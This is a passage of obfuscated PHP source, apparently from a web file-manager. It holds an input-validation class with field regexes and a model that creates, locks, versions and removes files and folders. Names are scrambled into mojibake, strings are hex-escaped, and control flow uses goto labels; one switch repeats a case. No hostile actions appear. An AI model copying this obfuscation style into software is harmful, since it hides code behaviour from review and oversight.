$Ağêâœˆä[$CÑÇ°ÚÌª[1846]]) { $EÍºÉ‹¯¼‘ = $Ağêâœˆä[$CÑÇ°ÚÌª[1846]]; } goto f”ÜÉ«˜½Ù; f”ÜÉ«˜½Ù: if (!array_key_exists($AØ«•ï‹Ù¾, $in)) { if (array_key_exists($CÑÇ°ÚÌª[1847], $Ağêâœˆä)) { if (!is_null($Ağêâœˆä[$CÑÇ°ÚÌª[1847]])) { $F­—Ş“®Î[$EÍºÉ‹¯¼‘] = $Ağêâœˆä[$CÑÇ°ÚÌª[1847]]; } } else { if (isset($Ağêâœˆä[$CÑÇ°ÚÌª[1848]])) { $eªâİˆçº[] = $fšøª²£ğ; } } continue; } if (isset($Ağêâœˆä[$CÑÇ°ÚÌª[1848]]) && $Ağêâœˆä[$CÑÇ°ÚÌª[1848]] == $CÑÇ°ÚÌª[278]) { $CÑƒÓêåì“ = json_decode($in[$AØ«•ï‹Ù¾], !0); if (is_array($CÑƒÓêåì“)) { $F­—Ş“®Î[$EÍºÉ‹¯¼‘] = $CÑƒÓêåì“; } else { if (array_key_exists($CÑÇ°ÚÌª[1847], $Ağêâœˆä)) { if (!is_null($Ağêâœˆä[$CÑÇ°ÚÌª[1847]])) { $F­—Ş“®Î[$EÍºÉ‹¯¼‘] = $Ağêâœˆä[$CÑÇ°ÚÌª[1847]]; } } else { $eªâİˆçº[] = $fšøª²£ğ; } } continue; } $fƒ—î÷Åé = _get($Ağêâœˆä, $CÑÇ°ÚÌª[1007]); goto c œ¸›ñÚ; c œ¸›ñÚ: if (isset($Ağêâœˆä[$CÑÇ°ÚÌª[1848]]) && !self::check($in[$AØ«•ï‹Ù¾], $Ağêâœˆä[$CÑÇ°ÚÌª[1848]], $fƒ—î÷Åé)) { if (array_key_exists($CÑÇ°ÚÌª[1847], $Ağêâœˆä)) { if (!is_null($Ağêâœˆä[$CÑÇ°ÚÌª[1847]])) { $F­—Ş“®Î[$EÍºÉ‹¯¼‘] = $Ağêâœˆä[$CÑÇ°ÚÌª[1847]]; } } else { $eªâİˆçº[] = $fšøª²£ğ; } continue; } $F­—Ş“®Î[$EÍºÉ‹¯¼‘] = $in[$AØ«•ï‹Ù¾]; goto EÛÉ¡º—Ñ–; EÛÉ¡º—Ñ–: } goto f¿Ç¨°…À­; C‚Ò¾¥™É: $CÑÇ°ÚÌª =& $_SERVER[Ìó]; global $in; $F­—Ş“®Î = array(); goto dê°Ê‰¯¤; f¿Ç¨°…À­: if (count($eªâİˆçº) > 0) { show_json(implode($CÑÇ°ÚÌª[1849], $eªâİˆçº), !1); } return $F­—Ş“®Î; goto Bßİ’˜àç; Bßİ’˜àç: } public static function reg($d”ˆ©šµñÈ = "\x72\x65\161\165\151\162\x65") { static $dÍ„ÏŒ¹÷ç = array("\x72\145\161\165\x69\162\x65" => "\x2e\53", "\156\x75\x6d\142\x65\162" => "\134\x64\53", "\150\x65\170" => "\x5b\60\55\71\101\x2d\106\x61\x2d\146\x5d\53", "\x69\156\x74" => "\133\x2d\134\53\135\x3f\x5c\144\x2b", "\142\157\157\154" => "\x30\x7c\61", "\x66\154\x6f\141\x74" => "\133\55\x5c\x2b\x5d\77\x5c\x64\53\50\134\x2e\x5c\x64\53\51\x3f", "\x65\x6e\x67\x6c\151\163\x68" => "\x5b\101\55\x5a\x61\x2d\x7a\40\x5d\53", "\143\x68\151\156\x65\x73\145" => "\x5b\x5c\170\173\64\x65\60\x30\x7d\x2d\x5c\170\x7b\x39\x66\141\x35\x7d\x5d\53", "\x68\141\163\x43\x68\151\x6e\x65\163\x65" => "\x2f\x28\133\x5c\170\173\64\145\x30\60\175\x2d\x5c\x78\x7b\x39\x66\141\65\x7d\135\53\51\57\165", "\x65\x6d\141\151\154" => "\x5c\167\x2b\x28\x5b\x5c\x2e\134\x2d\135\x5c\167\53\51\52\134\100\134\x77\x2b\50\133\x5c\x2e\134\x2d\x5d\134\167\x2b\51\x2a\x5c\56\134\x77\53", "\160\x68\157\156\145" => "\x31\133\63\x2d\x39\x5d\x5c\x64\173\71\175", "\164\145\154\160\x68\157\156\x65" => "\x28\134\x28\134\x64\173\63\x2c\x34\x7d\x5c\x29\174\134\144\173\63\54\x34\x7d\55\x7c\x5c\163\x29\x3f\134\144\173\x37\54\61\64\x7d", "\165\x72\154" => "\50\x68\164\x74\160\174\x66\x74\x70\x7c\150\x74\164\160\x73\51\72\134\x2f\134\x2f\x5b\134\167\x5c\x2d\137\x5d\x2b\50\x5c\56\133\x5c\x77\x5c\x2d\x5f\135\x2b\x29\53\50\x5b\x5c\x77\x5c\55\134\x2e\x2c\100\x3f\x5e\75\x25\46\x3a\x5c\57\x7e\x5c\x2b\x23\135\x2a\133\x5c\167\x5c\55\134\x40\x3f\x5e\x3d\45\x26\x5c\57\176\134\53\43\135\51\77", "\165\162\154\x46\x75\154\154" => "\x5b\x61\x2d\172\101\55\172\x5d\x2b\x3a\x5c\57\134\57\133\136\134\x73\135\x2a", "\151\160" => "\50\x5c\x64\173\61\x2c\x33\x7d\134\x2e\x29\x7b\x33\x7d\x28\x5c\x64\x7b\61\x2c\63\x7d\x29", "\172\151\160" => "\x5b\61\55\71\135\134\144\x7b\65\x7d\x28\x3f\41\134\x64\x29", "\x69\x64\103\x61\x72\x64" => "\50\134\144\x7b\x31\x35\x7d\51\x7c\x28\x5c\x64\x7b\61\x37\175\x28\134\x64\174\130\174\170\x29\x29", "\x63\x6f\x6c\x6f\162" => "\43\50\133\x30\x2d\x39\x41\55\x46\141\x2d\146\135\x7b\x33\x7d\x7c\x5b\60\55\71\x41\x2d\106\141\55\x66\x5d\x7b\x36\x7d\51", "\164\151\x6d\x65" => "\50\133\60\x2d\x31\135\134\x64\174\x32\133\x30\x2d\64\135\x29\x3a\x5b\x30\55\65\x5d\134\144", "\144\x61\x74\145" => "\134\144\173\x34\175\x5b\55\134\57\135\x3f\50\60\133\61\55\71\x5d\x7c\x31\x5b\x30\x2d\x32\x5d\51\133\55\x5c\x2f\135\x3f\x28\x5b\60\55\x32\x5d\x5c\x64\x7c\x33\133\x30\55\61\x5d\x29", "\144\x61\164\145\x54\151\x6d\145" => "\x5c\x64\x7b\64\175\x5b\x2d\x5c\x2f\135\77\50\60\x5b\61\55\x39\135\x7c\x31\x5b\x30\x2d\62\x5d\51\x5b\55\134\57\x5d\77\50\133\x30\x2d\x32\x5d\x5c\144\174\x33\x5b\x30\x2d\61\135\51\134\x73\x2b\50\133\x30\55\61\135\134\144\174\62\x5b\x30\55\x34\x5d\x29\x3a\x5b\60\x2d\65\135\x5c\x64", "\160\141\x73\x73\167\x6f\162\x64" => "\50\77\75\x2e\52\x5c\x64\51\x28\77\75\x2e\x2a\x5b\141\x2d\172\x5d\x29\50\77\x3d\56\52\133\x41\x2d\132\x5d\51\x2e\173\x38\54\62\x30\175", "\x6b\145\171" => "\133\101\x2d\x5a\x61\55\x7a\x30\x2d\71\x5f\134\x2d\134\x2e\135\53", "\153\145\x79\106\165\x6c\x6c" => "\133\101\55\132\141\55\x7a\60\x2d\x39\x5f\x5c\55\134\x2e\134\x73\54\135\53"); if (!$d”ˆ©šµñÈ) { return $dÍ„ÏŒ¹÷ç; } return $dÍ„ÏŒ¹÷ç[$d”ˆ©šµñÈ]; } public static function check($F˜–Åõ››š, $cá‘—Ğì×‰, $eíˆÖİ³Ê = null) { $dà™õóËŒ„ =& $_SERVER[Ìó]; switch ($cá‘—Ğì×‰) { case $dà™õóËŒ„[7]: return in_array($F˜–Åõ››š, $eíˆÖİ³Ê); break; case $dà™õóËŒ„[1850]: return floatval($F˜–Åõ››š) > $eíˆÖİ³Ê; break; case $dà™õóËŒ„[1851]: return floatval($F˜–Åõ››š) < $eíˆÖİ³Ê; break; case $dà™õóËŒ„[321]: return strlen($F˜–Åõ››š) >= $eíˆÖİ³Ê[0] && strlen($F˜–Åõ››š) <= $eíˆÖİ³Ê[1]; break; case $dà™õóËŒ„[321]: if (is_array($eíˆÖİ³Ê)) { return strlen($F˜–Åõ››š) >= $eíˆÖİ³Ê[0] && strlen($F˜–Åõ››š) <= $eíˆÖİ³Ê[1]; break; } else { return strlen($F˜–Åõ››š) == $eíˆÖİ³Ê; break; } case $dà™õóËŒ„[317]: return floatval($F˜–Åõ››š) >= $eíˆÖİ³Ê[0] && floatval($F˜–Åõ››š) <= $eíˆÖİ³Ê[1]; break; } $c¾»ÔêÅïô = self::reg(!1); $cá‘—Ğì×‰ = isset($c¾»ÔêÅïô[$cá‘—Ğì×‰]) ? $c¾»ÔêÅïô[$cá‘—Ğì×‰] : $cá‘—Ğì×‰; if (substr($cá‘—Ğì×‰, 0, 1) != $dà™õóËŒ„[8]) { $cá‘—Ğì×‰ = $dà™õóËŒ„[1852] . $cá‘—Ğì×‰ . $dà™õóËŒ„[1853]; } return preg_match($cá‘—Ğì×‰, $F˜–Åõ››š) === 1; } public static function get($CÔ…É§ÛÁ, $FˆÎ‚Äï„‹ = null, $dÛ“‡‚˜„ó = null, $Dô®Ù–æ = null) { goto B²¾¥”¹Â; B²¾¥”¹Â: $AÂè´…†Û• =& $_SERVER[Ìó]; $aóÅ¿Şğ‡” = array(); if (!is_null($dÛ“‡‚˜„ó)) { $aóÅ¿Şğ‡”[$AÂè´…†Û•[34]] = $dÛ“‡‚˜„ó; } goto f‚¬ÃôªÍ; f‚¬ÃôªÍ: if (!is_null($Dô®Ù–æ)) { $aóÅ¿Şğ‡”[$AÂè´…†Û•[1007]] = $Dô®Ù–æ; } if (!is_null($FˆÎ‚Äï„‹)) { $aóÅ¿Şğ‡”[$AÂè´…†Û•[1848]] = $FˆÎ‚Äï„‹; } $eóøŒ¡†Ñ’ = Input::getArray(array($CÔ…É§ÛÁ => $aóÅ¿Şğ‡”)); goto dÕ°Ó¶ğ; dÕ°Ó¶ğ: return $eóøŒ¡†Ñ’[$CÔ…É§ÛÁ]; goto d²¦À½ù÷; d²¦À½ù÷: } } goto bŠğ®¿’À¹; C÷Ñİê½œÌ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($CïÏ››¸Â) { $F¥îš«ã‡ =& $_SERVER[Ìó]; $cÛœè¼šÔá = Model($F¥îš«ã‡[469])->where(array($F¥îš«ã‡[1400] => $CïÏ››¸Â))->find(); $e´Êò÷ˆ‘— = $this->_mkdirRoot(SourceModel::TYPE_USER, $CïÏ››¸Â, $cÛœè¼šÔá[$F¥îš«ã‡[28]]); $this->userDesktopAdd($e´Êò÷ˆ‘—); return $e´Êò÷ˆ‘—; } public function userDesktopAdd($C’Û’¡»¤) { $A˜”ğ“Ğºá =& $_SERVER[Ìó]; $FçÄêÅ·…² = LNG($A˜”ğ“Ğºá[2287]); $D¼¥ÈŠ‘ô = $this->mkdir($C’Û’¡»¤, $FçÄêÅ·…²); $this->metaSet($D¼¥ÈŠ‘ô, $A˜”ğ“Ğºá[2288], $A˜”ğ“Ğºá[83]); $this->metaSet($C’Û’¡»¤, $A˜”ğ“Ğºá[2289], $D¼¥ÈŠ‘ô); } public function groupRootAdd($f±´Ãê¡°ó) { $fÁ®ÃÂ‹Î =& $_SERVER[Ìó]; $b‚¢ÜÕ°Åß = Model($fÁ®ÃÂ‹Î[453])->where(array($fÁ®ÃÂ‹Î[2144] => $f±´Ãê¡°ó))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $f±´Ãê¡°ó, $b‚¢ÜÕ°Åß[$fÁ®ÃÂ‹Î[28]]); } public function systemRootPathAdd($bÆÍÍˆÕä) { if ($bÆÍÍˆÕä != $_SERVER[Ìó][1085]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $bÆÍÍˆÕä); } public function userRootRemove($BãÊ•Ü‘„) { $DØøõé§¸ = $this->sourceRoot(SourceModel::TYPE_USER, $BãÊ•Ü‘„); if (!$DØøõé§¸) { return; } $this->remove($DØøõé§¸, !1); } public function groupRootRemove($cÅÒ –ãè‹) { $dºê“–†ø = $this->sourceRoot(SourceModel::TYPE_GROUP, $cÅÒ –ãè‹); if (!$dºê“–†ø) { return; } $this->remove($dºê“–†ø, !1); } private function _mkdirRoot($fØĞ„à™Ùï, $b¦™Ìå°÷³, $fïÇ¡‘’Á±) { goto D›Ä†ÎÄ©; Dß˜ÁÇ‚Ù: CacheLock::unlock($CµßˆÌÈŒ÷); return $AÏé„®ì°Ó; goto d´Ê³¶¨‹À; D›Ä†ÎÄ©: $fäç¶¶±’ =& $_SERVER[Ìó]; $bñ–±ªØ¢Å = array($fäç¶¶±’[364] => 0, $fäç¶¶±’[516] => $fØĞ„à™Ùï, $fäç¶¶±’[517] => $b¦™Ìå°÷³, $fäç¶¶±’[513] => 1, $fäç¶¶±’[518] => USER_ID, $fäç¶¶±’[519] => USER_ID, $fäç¶¶±’[514] => $fäç¶¶±’[33], $fäç¶¶±’[520] => $fäç¶¶±’[465], $fäç¶¶±’[391] => 0, $fäç¶¶±’[515] => 0, $fäç¶¶±’[415] => 0, $fäç¶¶±’[521] => $fäç¶¶±’[33]); if ($Bì‹ƒÉÎ = $this->where($bñ–±ªØ¢Å)->find()) { return $Bì‹ƒÉÎ[$fäç¶¶±’[365]]; } goto a‰˜ÑÁ£ÔÖ; a‰˜ÑÁ£ÔÖ: $CµßˆÌÈŒ÷ = "\115\x6f\x64\145\154\123\x6f\x75\x72\x63\x65\56\x6d\x6b\x64\x69\162\x52\x6f\157\x74\56{$fØĞ„à™Ùï}\56{$b¦™Ìå°÷³}\x2e" . $fïÇ¡‘’Á±; CacheLock::lock($CµßˆÌÈŒ÷); $bñ–±ªØ¢Å[$fäç¶¶±’[28]] = $fïÇ¡‘’Á±; goto C«ÖôÄ•×æ; C«ÖôÄ•×æ: $AÏé„®ì°Ó = $this->add($bñ–±ªØ¢Å); $fØŠôÆ¦Ó = array($fäç¶¶±’[522] => short_id($AÏé„®ì°Ó)); $this->where(array($fäç¶¶±’[379] => $AÏé„®ì°Ó))->save($fØŠôÆ¦Ó); goto Dß˜ÁÇ‚Ù; d´Ê³¶¨‹À: } private function sourceRoot($DÖŒ†¢ÁÇ, $dÜÅ’‚›ãĞ, $e‡‹ƒÊõîè = false) { $c¨¿Òø°èİ =& $_SERVER[Ìó]; $d×ëİºÂÔ = array($c¨¿Òø°èİ[364] => 0, $c¨¿Òø°èİ[516] => $DÖŒ†¢ÁÇ, $c¨¿Òø°èİ[517] => $dÜÅ’‚›ãĞ); if ($a¹·ÈŸËÙ„ = $this->where($d×ëİºÂÔ)->find()) { return $e‡‹ƒÊõîè ? $a¹·ÈŸËÙ„ : $a¹·ÈŸËÙ„[$c¨¿Òø°èİ[365]]; } return !1; } public function sourceRootGroup($Dù•½œ¶½¿) { $f÷¢íîĞ¦Ö =& $_SERVER[Ìó]; if (is_string($Dù•½œ¶½¿)) { $Dù•½œ¶½¿ = array($Dù•½œ¶½¿); } $dÊİÎÆôäÉ = array($f÷¢íîĞ¦Ö[364] => 0, $f÷¢íîĞ¦Ö[516] => SourceModel::TYPE_GROUP, $f÷¢íîĞ¦Ö[517] => array($f÷¢íîĞ¦Ö[7], $Dù•½œ¶½¿)); $b¿Ú÷¼“è´ = $this->listSource($dÊİÎÆôäÉ, 1000); return array_to_keyvalue($b¿Ú÷¼“è´[$f÷¢íîĞ¦Ö[74]], $f÷¢íîĞ¦Ö[451]); } public function mkfile($eÀš°ÌÎ±â, $a”«¤ØæÖ®, $eÙ’Œ„ŒƒÑ = '', $aØÎ§õ‡¾ = REPEAT_RENAME) { $eË™‘ƒ”î =& $_SERVER[Ìó]; $E†¤¢Æïî = Model($eË™‘ƒ”î[539])->addFileByContent($eÙ’Œ„ŒƒÑ, $a”«¤ØæÖ®); return $this->_createFileCall($eÀš°ÌÎ±â, $a”«¤ØæÖ®, $E†¤¢Æïî, $aØÎ§õ‡¾, $eË™‘ƒ”î[1114]); } public function addFile($a™Šê‡®ŠÏ, $A¿÷±Ğ£Ô, $Dî’í¦İô, $AÃ™Ö®ÌÈ• = false, $E‰¡÷§¿çÀ = REPEAT_RENAME) { $FœèŠÅ¢ = Model($_SERVER[Ìó][539])->addFile($A¿÷±Ğ£Ô, $Dî’í¦İô, $AÃ™Ö®ÌÈ•); return $this->_createFileCall($a™Šê‡®ŠÏ, $Dî’í¦İô, $FœèŠÅ¢, $E‰¡÷§¿çÀ); } public function addFileByFileID($fÔ•¥ïø¾, $c¥®‚Ï•™ë, $a‚¢ØÔëäÁ, $f‚‹—†²„ = REPEAT_RENAME) { $d ’ÌóÍ± =& $_SERVER[Ìó]; $cƒìÈ÷¬œ¿ = Model($d ’ÌóÍ±[539])->find($c¥®‚Ï•™ë); Model($d ’ÌóÍ±[539])->linkAdd($c¥®‚Ï•™ë); return $this->_createFileCall($fÔ•¥ïø¾, $a‚¢ØÔëäÁ, $cƒìÈ÷¬œ¿, $f‚‹—†²„); } public function addFileByRemote($dÁ—ÊØ§¼†, $A†ãôÔÊîò, $A‘×Åƒµ‚, $Fšøèø©ª¹ = array(), $D§Å¾Õø¢´ = REPEAT_RENAME) { $dÔø¬ëÈ§ø = Model($_SERVER[Ìó][539])->addFileByRemote($A†ãôÔÊîò, $A‘×Åƒµ‚, $Fšøèø©ª¹); return $this->_createFileCall($dÁ—ÊØ§¼†, $A‘×Åƒµ‚, $dÔø¬ëÈ§ø, $D§Å¾Õø¢´); } private function _createFileCall($e—£Íâºİ, $eĞãÇŒëì¡, $FË—…¿¸¢ì, $B™›¯š¾Á¥, $A‰œ¹ÆÍè = "\x75\160\154\x6f\x61\144") { goto F«ÌŠ£šÄÔ; a±Î¿ƒ·Ê’: $C”‡Â¶‘­¯ = $this->_createFile($e—£Íâºİ, $eĞãÇŒëì¡, $FË—…¿¸¢ì, $B™›¯š¾Á¥, $DšÛ·‘íÎí); if (!$DšÛ·‘íÎí) { Model($A¿¢ŒéëñÀ[417])->remove($FË—…¿¸¢ì[$A¿¢ŒéëñÀ[414]]); } else { if ($C”‡Â¶‘­¯) { Model($A¿¢ŒéëñÀ[2259])->eventCreate($C”‡Â¶‘­¯, $A‰œ¹ÆÍè); } } $this->lockWriteEnd($e—£Íâºİ, $eĞãÇŒëì¡); goto aÍ«ˆô©…; aÍ«ˆô©…: return $C”‡Â¶‘­¯; goto dœîÁîº±Ë; F«ÌŠ£šÄÔ: $A¿¢ŒéëñÀ =& $_SERVER[Ìó]; $DšÛ·‘íÎí = !1; $this->lockWriteStart($e—£Íâºİ, $eĞãÇŒëì¡); goto a±Î¿ƒ·Ê’; dœîÁîº±Ë: } public function mkdir($C‚ñÌŸƒÏÕ, $Bù¶”’‹, $D¶è¹¶ä˜¹ = REPEAT_SKIP) { goto AÔÎ¨àÈÉ‰; AÔÎ¨àÈÉ‰: $CÓ¤¿‡ñÖŠ =& $_SERVER[Ìó]; $cÇä’¿èöé = $this->sourceInfo($C‚ñÌŸƒÏÕ); if (!$cÇä’¿èöé) { return !1; } goto A÷ƒÔš‹¼; A÷ƒÔš‹¼: $this->lockWriteStart($C‚ñÌŸƒÏÕ, $Bù¶”’‹); if ($D¶è¹¶ä˜¹ !== !1) { $Bİ™ïÎï™ = $this->fileNameExist($C‚ñÌŸƒÏÕ, $Bù¶”’‹); if ($Bİ™ïÎï™ && $D¶è¹¶ä˜¹ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($C‚ñÌŸƒÏÕ, $Bù¶”’‹); return $Bİ™ïÎï™; } $Bù¶”’‹ = $this->fileNameAuto($C‚ñÌŸƒÏÕ, $Bù¶”’‹, $D¶è¹¶ä˜¹); } $B­°ñË”ä³ = array($CÓ¤¿‡ñÖŠ[513] => 1, $CÓ¤¿‡ñÖŠ[382] => $Bù¶”’‹, $CÓ¤¿‡ñÖŠ[514] => $CÓ¤¿‡ñÖŠ[33], $CÓ¤¿‡ñÖŠ[415] => 0, $CÓ¤¿‡ñÖŠ[515] => 0); goto D¾Í¨éÁù°; B„Ñ¶Ÿ±Ë: return $aÕ¦á÷¬ä²; goto CîØÅ•ô»¼; D¾Í¨éÁù°: $aÕ¦á÷¬ä² = $this->_addSoure($B­°ñË”ä³, $cÇä’¿èöé); Model($CÓ¤¿‡ñÖŠ[2259])->eventCreate($aÕ¦á÷¬ä², $CÓ¤¿‡ñÖŠ[1115]); $this->lockWriteEnd($C‚ñÌŸƒÏÕ, $Bù¶”’‹); goto B„Ñ¶Ÿ±Ë; CîØÅ•ô»¼: } private function _createFile($E…›ÏØ…“², $CìÁ²˜Ûºñ, $A¬¸ƒŒæ¾å, $bÃİßİ“Ôë, &$eØ˜ÊÃ³‹) { goto cª÷äˆˆƒ–; cª÷äˆˆƒ–: $A¼©¹“Ù£ =& $_SERVER[Ìó]; $d ÇÀèÊ°· = $this->sourceInfo($E…›ÏØ…“²); if (!$A¬¸ƒŒæ¾å || !$d ÇÀèÊ°·) { return !1; } goto C»èÅğ”ƒ; B¤¤ñ¿ÙÄÈ: $D›·À›ğ›Ù = array($A¼©¹“Ù£[513] => 0, $A¼©¹“Ù£[382] => $CìÁ²˜Ûºñ, $A¼©¹“Ù£[514] => get_path_ext($CìÁ²˜Ûºñ), $A¼©¹“Ù£[415] => $A¬¸ƒŒæ¾å[$A¼©¹“Ù£[414]], $A¼©¹“Ù£[515] => $A¬¸ƒŒæ¾å[$A¼©¹“Ù£[77]]); $F¿Œ‡·Â‘á = $this->_addSoure($D›·À›ğ›Ù, $d ÇÀèÊ°·); $this->folderSizeReset($E…›ÏØ…“²); goto b™›­ÈÕÎ; b™›­ÈÕÎ: return $F¿Œ‡·Â‘á; goto bàÑĞ¢ÆÜÂ; C»èÅğ”ƒ: if ($bÃİßİ“Ôë !== !1) { $dÆ·‹ÊÔˆœ = $this->fileNameExist($E…›ÏØ…“², $CìÁ²˜Ûºñ); } $eØ˜ÊÃ³‹ = !0; if ($bÃİßİ“Ôë && $dÆ·‹ÊÔˆœ) { if ($bÃİßİ“Ôë == REPEAT_SKIP) { $eØ˜ÊÃ³‹ = !1; return $dÆ·‹ÊÔˆœ; } else { if ($bÃİßİ“Ôë == REPEAT_REPLACE) { $E¯‚ŠË®ì† = $this->sourceInfo($dÆ·‹ÊÔˆœ); $Cã…¾°õçË = $this->fileHistory($E¯‚ŠË®ì†, $A¬¸ƒŒæ¾å[$A¼©¹“Ù£[414]], $A¬¸ƒŒæ¾å[$A¼©¹“Ù£[77]]); if (!$Cã…¾°õçË) { $eØ˜ÊÃ³‹ = !1; } else { $this->folderSizeReset($E…›ÏØ…“²); } return $dÆ·‹ÊÔˆœ; } else { $CìÁ²˜Ûºñ = $this->fileNameAuto($E…›ÏØ…“², $CìÁ²˜Ûºñ, $bÃİßİ“Ôë, !1); } } } goto B¤¤ñ¿ÙÄÈ; bàÑĞ¢ÆÜÂ: } protected function fileHistory($Cˆ‡Î³õ©À, $F£÷î¦Ïİ, $CØÉµÈ½º) { goto E‚„×ìÃ; c˜àöÔ¡Ã: return !0; goto B™†¹‘Ë™ƒ; E‚„×ìÃ: $C»ê³ºõß­ =& $_SERVER[Ìó]; if ($Cˆ‡Î³õ©À[$C»ê³ºõß­[414]] == $F£÷î¦Ïİ) { return !1; } $this->checkLock($Cˆ‡Î³õ©À[$C»ê³ºõß­[365]], $F£÷î¦Ïİ); goto c£Ì©™¢ãÍ; c£Ì©™¢ãÍ: Model($C»ê³ºõß­[2290])->addHistory($Cˆ‡Î³õ©À); $e²İô–…£Â = array($C»ê³ºõß­[519] => USER_ID, $C»ê³ºõß­[386] => time(), $C»ê³ºõß­[414] => $F£÷î¦Ïİ, $C»ê³ºõß­[77] => $CØÉµÈ½º); $this->where(array($C»ê³ºõß­[379] => $Cˆ‡Î³õ©À[$C»ê³ºõß­[365]]))->save($e²İô–…£Â); goto c˜àöÔ¡Ã; B™†¹‘Ë™ƒ: } public function checkLock($B­ù„Æ´«, $DéÇ³İƒ²) { goto b•ÛŞ†Ã; FÁì’¢¸†: $this->_createFileCall($cÜ§½¢†ïõ[$CœÙÖ¨àÛƒ[456]], $f²ƒá†À õ, $EŒ‡‘ÀƒŒ, REPEAT_REPLACE, $CœÙÖ¨àÛƒ[1114]); $EŒ«¼‹Ùñ† = $cÜ§½¢†ïõ[$CœÙÖ¨àÛƒ[412]][$CœÙÖ¨àÛƒ[476]]; $eƒÔ„Ğ†“Ú = $EŒ«¼‹Ùñ†[$CœÙÖ¨àÛƒ[2292]] ? $EŒ«¼‹Ùñ†[$CœÙÖ¨àÛƒ[2292]] : $EŒ«¼‹Ùñ†[$CœÙÖ¨àÛƒ[28]]; goto EÕí†¦‡ëÊ; b•ÛŞ†Ã: $CœÙÖ¨àÛƒ =& $_SERVER[Ìó]; $cÜ§½¢†ïõ = $this->pathInfo($B­ù„Æ´«); if (!$this->fileIsLock($cÜ§½¢†ïõ, !0)) { return; } goto dê«ù¨°ö; dê«ù¨°ö: $Aí¤°¸½‡‚ = Session::get($CœÙÖ¨àÛƒ[2291]); $f²ƒá†À õ = substr($cÜ§½¢†ïõ[$CœÙÖ¨àÛƒ[28]], 0, -1 - strlen($cÜ§½¢†ïõ[$CœÙÖ¨àÛƒ[156]])) . $CœÙÖ¨àÛƒ[1362] . $Aí¤°¸½‡‚ . $CœÙÖ¨àÛƒ[91] . $cÜ§½¢†ïõ[$CœÙÖ¨àÛƒ[156]]; $EŒ‡‘ÀƒŒ = Model($CœÙÖ¨àÛƒ[539])->find($DéÇ³İƒ²); goto FÁì’¢¸†; EÕí†¦‡ëÊ: show_json(LNG($CœÙÖ¨àÛƒ[2293]) . $CœÙÖ¨àÛƒ[2294] . LNG($CœÙÖ¨àÛƒ[2295]) . $CœÙÖ¨àÛƒ[2296] . $eƒÔ„Ğ†“Ú . $CœÙÖ¨àÛƒ[2297], !1); goto FŠó£èÙÖ–; FŠó£èÙÖ–: } public function fileIsLock($FÓœÙ½Ë¾ˆ, $bµò¬–í›Æ = false) { goto CÒ‚ÕŠØœÒ; CÒ‚ÕŠØœÒ: $f»­ìö±áÌ =& $_SERVER[Ìó]; if (!isset($FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[412]]) || !$FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[412]][$f»­ìö±áÌ[473]]) { return !1; } if ($FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[412]][$f»­ìö±áÌ[473]] != USER_ID) { return !0; } goto aíÅÓ™ÔÖ¶; aíÅÓ™ÔÖ¶: $CÙÂÎ´Â¦ = $GLOBALS[$f»­ìö±áÌ[6]][$f»­ìö±áÌ[84]][$f»­ìö±áÌ[474]]; if ($FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[412]][$f»­ìö±áÌ[475]] <= time() - $CÙÂÎ´Â¦) { $this->metaSet($FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[365]], $f»­ìö±áÌ[473], null); $this->metaSet($FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[365]], $f»­ìö±áÌ[475], null); } if ($bµò¬–í›Æ) { $this->metaSet($FÓœÙ½Ë¾ˆ[$f»­ìö±áÌ[365]], $f»­ìö±áÌ[475], time()); } goto C³£Õ‹ãöÄ; C³£Õ‹ãöÄ: return !1; goto E¼å˜‰—; E¼å˜‰—: } private function _addSoure($böŞ•ìé‚, $dÌºª´ŒŒ•) { goto e¶×ôÊÓÁ´; Dá’½×¬ŸÀ: $D»†‘·éî‡ = array($eÕœ—œ³öÀ[522] => short_id($Fà½…¤§¯)); $this->where(array($eÕœ—œ³öÀ[379] => $Fà½…¤§¯))->save($D»†‘·éî‡); $this->setNamePinyin($Fà½…¤§¯, $böŞ•ìé‚[$eÕœ—œ³öÀ[28]]); goto dŞ¿ÇÒ¹ì¦; c¶ù‹¸™†: $this->updateModifyTime($böŞ•ìé‚[$eÕœ—œ³öÀ[456]]); $fÙ Úê™Ã = $eÕœ—œ³öÀ[2298] . $dÌºª´ŒŒ•[$eÕœ—œ³öÀ[365]]; if (isset(self::$cacheChildList[$fÙ Úê™Ã])) { unset(self::$cacheChildList[$fÙ Úê™Ã]); } goto E‚‹Æ…â×¿; E‚‹Æ…â×¿: static $CáÓ‹ÚØºÅ = false; if (!$CáÓ‹ÚØºÅ) { Hook::trigger($eÕœ—œ³öÀ[503], $böŞ•ìé‚); $CáÓ‹ÚØºÅ = !0; } $Fà½…¤§¯ = $this->add($böŞ•ìé‚); goto Dá’½×¬ŸÀ; e¶×ôÊÓÁ´: $eÕœ—œ³öÀ =& $_SERVER[Ìó]; $FÇ“é¿¿™º = array($eÕœ—œ³öÀ[516] => $dÌºª´ŒŒ•[$eÕœ—œ³öÀ[367]], $eÕœ—œ³öÀ[517] => $dÌºª´ŒŒ•[$eÕœ—œ³öÀ[451]], $eÕœ—œ³öÀ[518] => USER_ID, $eÕœ—œ³öÀ[519] => USER_ID, $eÕœ—œ³öÀ[364] => $dÌºª´ŒŒ•[$eÕœ—œ³öÀ[365]], $eÕœ—œ³öÀ[520] => $dÌºª´ŒŒ•[$eÕœ—œ³öÀ[454]] . $dÌºª´ŒŒ•[$eÕœ—œ³öÀ[365]] . $eÕœ—œ³öÀ[47], $eÕœ—œ³öÀ[391] => 0, $eÕœ—œ³öÀ[521] => $eÕœ—œ³öÀ[33]); $böŞ•ìé‚ = array_merge($FÇ“é¿¿™º, $böŞ•ìé‚); goto c¶ù‹¸™†; dŞ¿ÇÒ¹ì¦: return $Fà½…¤§¯; goto CÂ…˜ÈÌ§; CÂ…˜ÈÌ§: } public function remove($eÒÂÈÖ³«ß, $Eë±¼°§ˆÈ = true) { goto F‡ ÄÕµ’; FåâÓ»‰¸ê: $this->recycleClear($d­£ÜÍˆ«‰); return $this->move($eÒÂÈÖ³«ß, $cÌ½à™ğ»ä, REPEAT_RENAME_FOLDER); goto Câ»„«œš«; F‡ 